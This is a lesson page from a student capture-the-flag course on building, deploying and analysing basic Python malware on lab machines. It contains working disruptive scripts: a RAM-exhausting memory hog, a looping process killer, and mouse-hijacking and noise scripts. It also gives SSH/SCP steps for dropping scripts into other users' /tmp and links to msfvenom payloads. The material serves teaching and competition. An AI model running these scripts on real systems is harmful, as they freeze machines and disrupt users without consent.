---
layout: default
title: MALchemist
---

# MALchemist   

**Focus**: Malware  
**Skill**: Analyze, Create, and Deploy Basic Malware  
**Activity**:  

<div style="text-align: center;">
  <img src="{{ 'classes/MALchemist/images/Malchemist-header.jpg' | relative_url }}" alt="" style="max-width: 80%; height: auto;">
</div>    

## Some wizards cast spells that seem like magic
### other wizards craft them
---
**play a game while I yap**:    
sudo apt install greed    
greed    
    
sudo apt install pacman4console    
pacman4console    
    
sudo apt install zangband    
man atc    
atc    
    
Specific Skills:
- Deploy a basic trojan horse
- Use IDLE to conduct malware analysis
- Use IDLE any to modify python based malware
- Use SSH and SCP to deploy and run scripts on remote devices
- Use psutil to monitor actions on remote computer
    
**Thing to experiment with on the range**:    
VNC    
msfconsole payloads  
<a href="https://raw.githubusercontent.com/jboyce1/ppsCTF/main/classes/MALchemist/msfvenom.txt" target="_blank" rel="noopener noreferrer">
    msfvenom.txt
</a>

        
#### Offensive Operations:
Deploying Trojans: Malchemists can craft and deploy Trojan horses, disguising them within seemingly legitimate software or scripts. These Trojans can be used to establish backdoors, exfiltrate data, or disrupt operations within an enemy's network.     
    
Script Deployment via SSH/SCP: With SSH and SCP, Malchemists can remotely deploy and execute scripts on target systems. These scripts could range from reconnaissance tools to actual payloads, enabling further penetration into the network or system. For the competition, deploying and executing basic trojans on the opponents' range will count for points.    
    
Monitoring with Psutil: Utilizing Psutil, Malchemists monitor systems for unusual activities that might indicate the presence of malware or unauthorized processes. By scrutinizing system behavior, they can spot and halt malicious actions before they cause significant damage. For the competition, deploying and monitoring basic spyware on the opponents' range will count for points.    
    
### Defensive Operations:
Malware Analysis with IDLE: On defense, Malchemists employ IDLE for detailed malware analysis, dissecting suspicious Python scripts to understand their structure, functionality, and potential impact. By understanding the threat, they can develop countermeasures and remove the malicious elements from their systems. For the competition, the discovery and removal of malware on your systems will prevent them from being accessed by your opponent.    
    
Malware Decontamination: The defensive Malchemist is skilled in identifying, classifying, and eradicating malware infections within their network. This includes quarantining infected systems, analyzing and reverse-engineering malware samples, and patching vulnerabilities to prevent future attacks. Additional points are achieved by classifying the malware that has infected your system.    
    
Both offensive and defensive cyber operations can benefit from the capabilities of these tools, either by exploiting their potential to penetrate and compromise systems or by leveraging their strengths to defend and fortify against such intrusions. It’s a digital arms race where the same tools can be purposed for attack or defense, depending on the hands they are in.

---
# Part 1: deploy a basic trojan horse    

Start a Kali machine and Ubuntu machine
    
On Kali    
Download the SecurePixViewer-ping.py file to your downloads folder on the kali machine into the Downloads folder:
<div class="scroll-box">
wget https://raw.githubusercontent.com/jboyce1/ppsCTF/main/classes/MALchemist/BasicTrojan/SecurePixViewer_ping.py 
</div>   

or add the flag to direct it to go to the downloads folder    
    
<div class="scroll-box">
wget -P ~/Downloads https://raw.githubusercontent.com/jboyce1/ppsCTF/main/classes/MALchemist/BasicTrojan/SecurePixViewer_ping.py
</div>
      
Download the Trojan_Horse.jpg to the Downloads folder    
<div class="scroll-box">
wget https://raw.githubusercontent.com/jboyce1/ppsCTF/main/classes/MALchemist/BasicTrojan/Trojan_Horse.jpg    
</div>
<div style="text-align: center;">
  <img src="{{ 'classes/MALchemist/BasicTrojan/Trojan_Horse.jpg' | relative_url }}" alt="" style="max-width: 80%; height: auto;">
</div>
    
Navigate to the Downloads directory from terminal (or open a terminal from the Downloads directory)    
run the program from terminal using the following command:    
#### `python3 SecurePixViewer-ping.py`    
Ctrl + C to quit the process    

**Now lets get it to ping your ubuntu machine**:    
**On Ubuntu** open a terminal, write down its ip address and start wireshark with superuser priviledges   
#### `sudo wireshark`    
Click on the network interface that is connecting to the internet (activity on line graph next to it)    
**On Kali**    
Open terminal and open the SecurePixViewer-ping.py    
#### `nano SecurePixViewer-ping.py`    
Replace the 192.168.1.100 with the ip address of your ubuntu machine    
Run the program again    
#### `python3 SecurePixViewer-ping.py`    
**On Ubuntu**    
Stop Wireshark by clicking on the red box in the top left    
In the search bar look for the pings by searching    
#### `ip.addr == your.kali.ip.here`    
Try it now    
Change some of the parameters (ping size/timing or message) and run it again.

<div style="text-align: center;">
<iframe width="560" height="315" src="https://www.youtube.com/embed/0waugi7-F9I?si=JkgGyEs7ieu3r4T9" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
</div>

---
# Part 2: use IDLE to conduct malware analysis

Start a Kali machine     
**On Kali**  Install IDLE    
#### `sudo apt install idle` 

Download the SecurePixViewer_ping.py malware:
#### `wget https://raw.githubusercontent.com/jboyce1/ppsCTF/main/classes/MALchemist/BasicTrojan/SecurePixViewer_ping.py`    
    
Open SecurePixViewer_ping.py by right clicking and opening with IDLE (right click and scroll down in the applications)    
Things to notice:    
Imports    
Try to determine why a program would want that to run    
Comments    
Try to understand why the developer would put these comments in    
Code blocks    
Try to determine what each ‘block’ is intending to do    
Look at the def perform_secret_action():    
    
<div style="text-align: center;">
<iframe width="560" height="315" src="https://www.youtube.com/embed/yjSL5aWEj5U?si=D2nFFnDkSlI3Pjnk" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
</div>    
    
Download aSecurePixViewer.txt
#### `wget https://raw.githubusercontent.com/jboyce1/ppsCTF/main/classes/MALchemist/BasicTrojan/aSecurePixViewer.txt`     
    
Open the file with IDLE    
Predict its actions and attempt to run it to see if what you predict is correct.   
    
**Try it now**    
Change some of the parameters:    
what type of file is opened (.txt, .py, .wav)    
the message    
trigger timing    
    
<div style="text-align: center;">
<iframe width="560" height="315" src="https://www.youtube.com/embed/f5k5oWXEfCY?si=Qlb_OXnaF29C_hGZ" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
</div>

---
# Part 3: use IDLE any to modify python-based malware    

Download the aSecurePixViewer.txt and the SecurePix_Modules.txt to mix and match your own malware.     

<div class="scroll-box">
wget https://raw.githubusercontent.com/jboyce1/ppsCTF/main/classes/MALchemist/BasicTrojan/aSecurePixViewer.txt </div> 

<div class="scroll-box">
wget https://raw.githubusercontent.com/jboyce1/ppsCTF/main/classes/MALchemist/BasicTrojan/SecurePix_Modules.txt </div> 

For the competition, you will have access to the malware that is on the range, but you will not be allowed to bring any of your own. If you are using modules outside of what is provided, they must be ‘approved' by the range.     
    
     
Try it now

If you get something fun or interesting, upload it here so I can share it or use it!    
      
<div style="text-align: center;">
<iframe width="560" height="315" src="https://www.youtube.com/embed/caXhiVwJrCk?si=TRP5FqA3yJvrcc5B" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
</div>

---
# Part 4: use ssh and scp to deploy and run scripts on remote devicesc & use psutil to monitor actions on remote computers

### Use wiresharkspy.py to compete this
#### `wget https://raw.githubusercontent.com/jboyce1/ppsCTF/main/classes/MALchemist/LogicBasedAction/wiresharkspy.py`
    
### Test on our own environment:    
It is always helpful to work the bugs out as much as you can on your own computer before moving on. Open terminal in Kali and type these commands one at a time:
    
#### `sudo apt intall pip`    
#### `sudo pip install psutil`    
    
#### `python3`
>>> #### `import psutil`
#### `quit()`

Now navigate to where you put the wiresharkspy.py and run wireshark program       
#### `python3 wiresharkspy.py`    
        
Open a new terminal and test it by running    
#### `sudo wireshark`    

### Move to remote device      
Open up your Ubuntu machine, get its ip address and ssh into it with x11 forwarding:    
#### `ssh -X ubuntu@10.15.x.x`    
    
Now that you're connected, install the necessary dependencies:    
#### `sudo apt intall pip`      
#### `sudo pip install psutil`    
#### `python3`    
>>> #### `import psutil`    
>>> #### `quit()`      

    
Find the filepath for the SCP by navigating to where your file is (in Kali) and where you want to put the file (in the Ubuntu SSH session) and typing in
#### `pwd`

Now in the Kali machine (replace what is in the red and blue with where the file is and where it is going from the pwd command)
    
#### `scp /home/kali/Downloads/wiresharkspy.py ubuntu@10.15.x.x:/home/ubuntu/Desktop`

Back into the SSH session in the Ubuntu machine    
Navigate to the location of the file using ls and cd until you can ls and see the wiresharkspy.py    
#### `python3 wiresharkspy.py`    
        
Go to the Ubuntu machine and open wireshark    
#### `sudo wireshark`    
Actually go back to the Kali machine to see if you received a notification    
    
<div style="text-align: center;">
<iframe width="560" height="315" src="https://www.youtube.com/embed/GjSZiXmqwpk?si=5r7Xp5Xi1ATsH0eM" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
</div>

---
# Part 5: use ssh and scp to deploy scripts and make them the default applications used to execute actions

<div style="text-align: center;">
<iframe width="560" height="315" src="https://www.youtube.com/embed/nD6owJoYdwA?si=9b9HthkWf6g99XQq" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
</div>

---
# Part 6: practice and explore
    
## Use the following scripts to experiment on the range  
 - create a blank document using touch or nano (ex. nano memory_hog.py) that ends in .py and run it by opening a terminal in the same directory and typing python3 memory_hog.py. Some scripts you run might need to be run with sudo privileges sudo python3 my_script.py
    
## Scripts that work if you are on another user    
Use the ability to write to the /tmp/ directory and run scripts from it to impact other users    
#### `scp kill_bully_memory.py <user>@<ip.address.here.blah>:/tmp/`
#### `ssh <user>@<ip.address.here.blah>`
#### `python3 /tmp/kill_bully_memory.py`

--    
### Memory Hog (Consumes RAM Until the opponent system freezes)
 - Fills RAM until the system lags or crashes.    
 - Uses multiple processes to make it harder to stop.
    
<div class="scroll-box">
#!/usr/bin/env python3    
import multiprocessing    
import time    
    
def memory_hog():    
    """Consumes system me mory indefinitely."""    
    data = []    
    while True:    
        data.append("X" * 10**6)  # Allocate 1MB per loop    
        time.sleep(0.5)    
    
if __name__ == "__main__":    
    for _ in range(multiprocessing.cpu_count()):    
        p = multiprocessing.Process(target=memory_hog)    
        p.start()    
</div>
   
--
### Process Killer (kills processes running in python3)
 - Uses pgrep -f to find running Python scripts.    
 - Kills the process if found.    
 - Runs in a loop so the bully can’t restart the script easily    

<div class="scroll-box">
#!/usr/bin/env python3
import subprocess
import time

BULLY_PROCESS = "python3"  # Target process running the bully script

def find_and_kill_process():
    """Finds and kills the bully script running as a Python process."""
    try:
        output = subprocess.run(["pgrep", "-f", BULLY_PROCESS], capture_output=True, text=True)
        pids = output.stdout.strip().split("\n")
        for pid in pids:
            if pid.isdigit():
                print(f"[+] Killing bully process: PID {pid}")
                subprocess.run(["kill", "-9", pid])
        print("[+] Bully script terminated.")
    except Exception as e:
        print(f"[-] Error terminating bully script: {e}")

if __name__ == "__main__":
    while True:
        find_and_kill_process()
        time.sleep(2)  # Check every 2 seconds
</div>

## Not useful for the competition, but fun...     
## learn by breaking things      
--    
### UI Chaos (Randomly Moves & Clicks the Mouse)    
 - Uses PyAutoGUI to randomly move and click the mouse    
 - Disrupts the bully’s control of their computer    
 - Runs forever unless killed     

<div class="scroll-box">
#!/usr/bin/env python3
import pyautogui
import time
import random

def chaos_mouse():
    """Randomly moves the mouse and clicks, making the machine unusable."""
    while True:
        x = random.randint(0, pyautogui.size()[0])
        y = random.randint(0, pyautogui.size()[1])
        pyautogui.moveTo(x, y, duration=0.2)
        if random.random() < 0.5:
            pyautogui.click()
        time.sleep(1)

if __name__ == "__main__":
    chaos_mouse()
</div>
    
 --
### Audio Mayhem (Plays an audio file just to be annoying)    
 - Runs continuously    
 - Plays a sound every 5 seconds    
 - Disrupts the user’s ability to focus on their attack    
 - you could SCP a Rick Roll here for good flavor    
    
<div class="scroll-box">
#!/usr/bin/env python3
import os
import time

def play_noise():
    """Plays an annoying beep sound every 5 seconds."""
    while True:
        os.system("aplay /usr/share/sounds/alsa/Front_Center.wav")  # Change to any available sound file
        time.sleep(5)

if __name__ == "__main__":
    play_noise()
</div>
